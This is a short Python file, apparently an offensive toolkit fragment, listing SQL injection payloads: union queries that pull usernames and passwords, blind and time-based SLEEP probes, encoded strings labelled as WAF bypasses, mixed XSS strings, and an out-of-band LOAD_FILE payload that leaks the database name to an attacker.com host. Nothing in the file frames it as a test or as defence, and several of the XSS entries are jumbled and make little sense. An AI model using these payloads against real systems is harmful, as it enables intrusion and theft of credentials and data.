# Ultra Advanced SQLi Payloads
union_payloads = [
    "' UNION SELECT NULL, NULL, NULL--",
    "' UNION SELECT username, password FROM users--",
    "' UNION ALL SELECT version(), database()--"
]
blind_payloads = [
    "' AND 1=1--",
    "' AND 1=2--",
    "%27%20AND%201=1%20%23"  # WAF bypass
]
time_based = [
    "' AND IF(1=1, SLEEP(5), 0)--",
    "' AND IF(1=2, SLEEP(5), 0)--",
    "%27%20AND%20IF(1=1,SLEEP(5),0)%20%23"  # Encoded
]
xss_mixed = [
    "<script>' OR '1'='1</script>",
    "<img src=x onerror=' OR '1'='1'>",
    "' OR '1'='1'/*"
]
out_of_band = [
    "' AND (SELECT LOAD_FILE(concat('\\\\',(SELECT database()),'.attacker.com\\x')))--"
]
all_payloads = union_payloads + blind_payloads + time_based + xss_mixed + out_of_band
